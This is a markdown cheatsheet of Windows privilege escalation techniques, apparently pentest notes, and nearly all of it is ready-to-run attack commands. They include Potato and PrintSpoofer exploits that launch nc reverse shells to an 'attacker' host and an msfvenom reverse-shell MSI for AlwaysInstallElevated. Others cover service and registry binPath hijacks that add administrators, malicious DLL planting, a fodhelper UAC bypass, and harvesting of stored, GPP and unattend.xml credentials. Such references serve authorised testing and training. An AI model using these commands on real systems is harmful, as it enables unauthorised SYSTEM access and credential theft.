---
tags:
  - hack-notes
  - privesc
---

# Windows Privilege Escalation Cheatsheet

## Table of Contents

- [Initial Enumeration](#initial-enumeration)
- [Automated Enumeration Tools](#automated-enumeration-tools)
- [Token Privileges and the Potato Family](#token-privileges-and-the-potato-family)
- [Unquoted Service Paths](#unquoted-service-paths)
- [Weak Service Permissions](#weak-service-permissions)
- [Weak Registry and Binary Permissions](#weak-registry-and-binary-permissions)
- [AlwaysInstallElevated](#alwaysinstallelevated)
- [Autoruns and Startup](#autoruns-and-startup)
- [Stored Credentials](#stored-credentials)
- [Group Policy Preferences and unattend.xml](#group-policy-preferences-and-unattendxml)
- [UAC Bypass](#uac-bypass)
- [DLL Hijacking and Search Order](#dll-hijacking-and-search-order)
- [Scheduled Tasks](#scheduled-tasks)
- [Named Pipe Impersonation](#named-pipe-impersonation)
- [Common Workflows](#common-workflows)
- [Quick Reference](#quick-reference)

---

## Initial Enumeration

bash

```bash
whoami                              # Current user
whoami /priv                        # Token privileges (look for SeImpersonate)
whoami /groups                      # Group membership and integrity level
whoami /all                         # SID, groups, and privileges together
hostname                            # System hostname
systeminfo                          # OS version, hotfixes, architecture
echo %USERNAME%                     # Current username variable
```

### Users, Groups, and Network

bash

```bash
net user                            # Local user accounts
net user administrator              # Detail for a single account
net localgroup                      # Local groups
net localgroup administrators       # Members of administrators
query user                          # Logged on sessions
ipconfig /all                       # Network configuration
netstat -ano                        # Listening ports with PIDs
route print                         # Routing table
```

### Patch Level and Architecture

bash

```bash
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"   # OS and build
wmic qfe get Caption,Description,HotFixID,InstalledOn  # Installed hotfixes
wmic os get osarchitecture          # 32 or 64 bit
set                                 # Environment variables (look for secrets)
```

---

## Automated Enumeration Tools

bash

```bash
.\winPEASx64.exe                    # Full local enumeration, 64 bit
.\winPEASany.exe quiet              # Architecture agnostic, less noise
winPEAS.bat                         # Batch variant where no exe allowed
```

### PowerUp

bash

```bash
powershell -ep bypass               # Allow script execution this session
. .\PowerUp.ps1                     # Dot source the module
Invoke-AllChecks                    # Run every PowerUp check
Invoke-AllChecks | Out-File -Encoding ascii checks.txt   # Save results
Get-ModifiableServiceFile           # List services with modifiable binaries
Get-UnquotedService                 # List unquoted service paths
```

### SharpUp and Seatbelt

bash

```bash
.\SharpUp.exe audit                 # Compiled PowerUp equivalent
.\Seatbelt.exe -group=all           # Broad host survey
.\Seatbelt.exe -group=system        # System focused checks
.\Seatbelt.exe -group=user          # User focused checks
```

### accesschk

bash

```bash
accesschk.exe /accepteula           # Accept license noninteractively
accesschk.exe -uwcqv "Users" *      # Services writable by Users
accesschk.exe -uwcqv "Authenticated Users" *   # Services writable by auth users
accesschk.exe -uwdqs Users c:\      # Directories writable by Users
accesschk.exe -wvu "C:\Program Files\app\app.exe"   # File write perms
```

---

## Token Privileges and the Potato Family

bash

```bash
whoami /priv                        # Identify exploitable token privileges
# SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege enables Potato attacks
```

### PrintSpoofer

bash

```bash
.\PrintSpoofer64.exe -i -c cmd      # Interactive SYSTEM cmd via spooler
.\PrintSpoofer64.exe -c "C:\nc.exe attacker 443 -e cmd"   # Run a command as SYSTEM
```

### GodPotato

bash

```bash
.\GodPotato-NET4.exe -cmd "cmd /c whoami"          # Confirm SYSTEM
.\GodPotato-NET4.exe -cmd "C:\nc.exe attacker 443 -e cmd"   # Reverse shell as SYSTEM
```

### JuicyPotato

bash

```bash
.\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c whoami" -t *   # Older Windows
.\JuicyPotato.exe -l 1337 -p revshell.bat -t * -c "{CLSID}"   # Use a known CLSID
```

### RoguePotato

bash

```bash
.\RoguePotato.exe -r attacker_ip -e "cmd.exe" -l 9999   # Newer Windows builds
# Set up the OXID resolver redirect on the attacker side first
```

> Use PrintSpoofer or GodPotato on modern Windows 10/11 and Server 2019/2022.
> JuicyPotato works on older builds lacking the DCOM patch.

---

## Unquoted Service Paths

bash

```bash
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """   # Find unquoted auto services
sc qc ServiceName                   # Confirm the BINARY_PATH_NAME has spaces and no quotes
```

### Exploiting an Unquoted Path

bash

```bash
# Path is C:\Program Files\Some Service\service.exe
# Windows tries: C:\Program.exe, then C:\Program Files\Some.exe
accesschk.exe -uwdqs Users "C:\Program Files\Some Service\"   # Check write access
copy payload.exe "C:\Program Files\Some.exe"   # Plant the hijack binary
sc stop ServiceName & sc start ServiceName     # Restart to trigger
```

---

## Weak Service Permissions

bash

```bash
sc qc ServiceName                   # Query service config and binary path
accesschk.exe -uwcqv "Users" ServiceName   # Confirm SERVICE_CHANGE_CONFIG rights
```

### Reconfiguring a Service Binary

bash

```bash
sc config ServiceName binPath= "C:\Windows\System32\cmd.exe /c net localgroup administrators user /add"   # Change binPath
sc stop ServiceName                 # Stop the service
sc start ServiceName                # Start to execute the new binPath
# Note the required space after binPath=
```

### Replacing a Writable Service Binary

bash

```bash
accesschk.exe -wvu "C:\path\service.exe"   # Confirm write on the exe
copy /y payload.exe "C:\path\service.exe"  # Overwrite the binary
sc stop ServiceName & sc start ServiceName # Restart to run payload as SYSTEM
```

---

## Weak Registry and Binary Permissions

bash

```bash
accesschk.exe -kvuqsw "HKLM\System\CurrentControlSet\Services"   # Writable service reg keys
reg query HKLM\System\CurrentControlSet\Services\ServiceName    # Inspect ImagePath
```

### Hijacking via Writable Registry ImagePath

bash

```bash
reg add "HKLM\System\CurrentControlSet\Services\ServiceName" /v ImagePath /t REG_EXPAND_SZ /d "C:\payload.exe" /f   # Replace ImagePath
sc stop ServiceName & sc start ServiceName   # Trigger as SYSTEM
```

---

## AlwaysInstallElevated

bash

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated   # Must equal 1
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated   # Both must be 1
```

### Exploiting with a Malicious MSI

bash

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=443 -f msi -o evil.msi   # Build MSI payload
msiexec /quiet /qn /i evil.msi      # Install silently, runs as SYSTEM
```

---

## Autoruns and Startup

bash

```bash
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run   # Machine wide autoruns
reg query HKCU\Software\Microsoft\Windows\Currentversion\Run   # Per user autoruns
.\autorunsc.exe -accepteula -a * -ct   # Sysinternals autoruns sweep
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"   # Startup folder
```

### Abusing a Writable Autorun Binary

bash

```bash
accesschk.exe -wvu "C:\path\to\autorun.exe"   # Confirm write access
copy /y payload.exe "C:\path\to\autorun.exe"  # Replace, runs at next privileged logon
```

---

## Stored Credentials

bash

```bash
cmdkey /list                        # Saved credentials in the vault
runas /savecred /user:administrator "cmd.exe"   # Reuse a stored credential
```

### Windows Credential Manager and Vault

bash

```bash
vaultcmd /list                      # List available vaults
vaultcmd /listcreds:"Windows Credentials"   # Enumerate stored creds
# In PowerShell with the right module:
Get-StoredCredential                # Dump credential objects where available
```

### Searching the Filesystem for Secrets

bash

```bash
findstr /si password *.txt *.ini *.config *.xml   # Recursive password grep
dir /s /b *pass* == *cred* == *.kdbx               # Filenames hinting at secrets
reg query HKLM /f password /t REG_SZ /s            # Search registry for passwords
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s   # PuTTY session keys
```

---

## Group Policy Preferences and unattend.xml

bash

```bash
findstr /S /I cpassword \\domain\sysvol\domain\policies\*.xml   # GPP cpassword search
dir /s Groups.xml                   # GPP files holding cpassword
```

### Decrypting GPP cpassword

bash

```bash
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhUoDw"   # AES key is public, decrypt
# In Metasploit: post/windows/gather/credentials/gpp
```

### Hunting unattend and sysprep Files

bash

```bash
dir /s /b unattend.xml sysprep.xml sysprep.inf   # Common install answer files
type C:\Windows\Panther\Unattend.xml             # Often holds base64 admin password
type C:\Windows\Panther\Autounattend.xml         # Alternate location
```

---

## UAC Bypass

bash

```bash
whoami /groups | findstr /i "High Mandatory"   # Confirm you are admin but medium integrity
```

### fodhelper Bypass

bash

```bash
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe" /f   # Set hijack command
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /f   # Empty DelegateExecute
fodhelper.exe                       # Auto elevates and runs the hijacked command
reg delete "HKCU\Software\Classes\ms-settings" /f   # Clean up after
```

### Other UAC Bypass Helpers

bash

```bash
.\akagi64.exe 23 C:\payload.exe     # UACMe with a chosen method id
# eventvwr.exe and sdclt.exe are alternate auto elevating binaries
```

---

## DLL Hijacking and Search Order

bash

```bash
# Search order: app dir, System32, System, Windows dir, current dir, PATH
.\ProcessMonitor.exe                # Filter for NAME NOT FOUND on .dll loads
accesschk.exe -dqv "C:\path\to\appdir"   # Confirm write access to a search location
```

### Building and Planting a Malicious DLL

bash

```bash
msfvenom -p windows/x64/exec CMD="net localgroup administrators user /add" -f dll -o hijack.dll   # Build DLL
copy hijack.dll "C:\path\to\appdir\missing.dll"   # Drop with the expected name
# Restart the application or service to load the DLL
```

---

## Scheduled Tasks

bash

```bash
schtasks /query /fo LIST /v         # List all tasks with full detail
schtasks /query /fo LIST /v | findstr /i "TaskName Run As User"   # Trim to essentials
Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq "SYSTEM"}   # PowerShell, SYSTEM tasks
```

### Abusing a Writable Task Binary

bash

```bash
accesschk.exe -wvu "C:\Tasks\run.bat"   # Confirm write on the task action
echo net localgroup administrators user /add >> "C:\Tasks\run.bat"   # Append payload
schtasks /run /tn "TaskName"        # Force the task to run now if permitted
```

---

## Named Pipe Impersonation

bash

```bash
# Requires SeImpersonatePrivilege. A privileged process connects to your pipe.
.\PrintSpoofer64.exe -i -c cmd      # Spooler relays a SYSTEM token over a named pipe
```

### Manual Pipe Server Concept

bash

```bash
# Create a named pipe, coerce a SYSTEM service to connect, then:
# ImpersonateNamedPipeClient followed by DuplicateTokenEx and CreateProcessWithToken
.\GodPotato-NET4.exe -cmd "cmd /c whoami"   # Automates DCOM coercion plus impersonation
```

---

## Common Workflows

### Workflow: Enumerate, Find Vector, Escalate

bash

```bash
# Step 1: identity and privileges
whoami /priv; whoami /groups       # Token privileges and integrity level

# Step 2: automated sweep
.\winPEASx64.exe quiet             # Full local enumeration

# Step 3: triage the high value findings
whoami /priv                       # SeImpersonate present? go Potato
wmic service get name,pathname,startmode | findstr /i auto   # Unquoted paths
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Step 4: exploit the chosen vector
# Potato, service reconfig, MSI install, DLL plant, etc.

# Step 5: confirm SYSTEM
whoami                             # Expect nt authority\system
```

### Workflow: SeImpersonate to SYSTEM

bash

```bash
whoami /priv | findstr /i impersonate   # Confirm the privilege
.\PrintSpoofer64.exe -i -c cmd          # Try PrintSpoofer first
.\GodPotato-NET4.exe -cmd "cmd /c whoami"   # Fallback for patched spooler
```

### Workflow: Service Misconfiguration

bash

```bash
.\SharpUp.exe audit                # Surface modifiable services
sc qc VulnService                  # Inspect the target service
sc config VulnService binPath= "C:\Windows\System32\cmd.exe /c net localgroup administrators user /add"
sc stop VulnService & sc start VulnService   # Trigger
```

### Workflow: Credential Harvest

bash

```bash
cmdkey /list                       # Saved credentials
findstr /si password *.xml *.ini *.txt *.config   # Filesystem secrets
findstr /S /I cpassword \\domain\sysvol\domain\policies\*.xml   # GPP creds
runas /savecred /user:administrator cmd.exe   # Reuse a found credential
```

---

## Quick Reference

bash

```bash
whoami /priv                                   # Token privileges
whoami /groups                                 # Integrity and groups
systeminfo                                     # OS and hotfixes
.\winPEASx64.exe quiet                          # Automated enumeration
. .\PowerUp.ps1; Invoke-AllChecks              # PowerUp checks
accesschk.exe -uwcqv "Users" *                 # Services writable by Users
sc qc ServiceName                              # Service config
sc config ServiceName binPath= "cmd /c ..."    # Reconfigure service binary
.\PrintSpoofer64.exe -i -c cmd                 # SeImpersonate to SYSTEM
.\GodPotato-NET4.exe -cmd "cmd /c whoami"      # Modern Potato
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msiexec /quiet /qn /i evil.msi                 # AlwaysInstallElevated abuse
findstr /S /I cpassword \\domain\sysvol\*.xml  # GPP cpassword
cmdkey /list                                   # Stored credentials
```

### Reference Sites

bash

```bash
# https://github.com/peass-ng/PEASS-ng         winPEAS
# https://github.com/PowerShellMafia/PowerSploit PowerUp
# https://github.com/GhostPack/Seatbelt        Seatbelt host survey
# https://github.com/itm4n/PrintSpoofer        PrintSpoofer
# https://github.com/BeichenDream/GodPotato    GodPotato
# https://lolbas-project.github.io             Living off the land binaries
# https://book.hacktricks.xyz                  HackTricks Windows privesc
```

---

## Related

- Checklists: [Build Review and VDI](../Checklists/Build%20Review%20and%20VDI.md), [Assumed Breach](../Checklists/Assumed%20Breach.md)
- [Active Directory and Kerberos](Active%20Directory%20and%20Kerberos.md)
- [NetExec and Impacket](NetExec%20and%20Impacket.md)
- [Reverse Shells and File Transfer](Reverse%20Shells%20and%20File%20Transfer.md)
- [Linux Privilege Escalation](Linux%20Privilege%20Escalation.md)
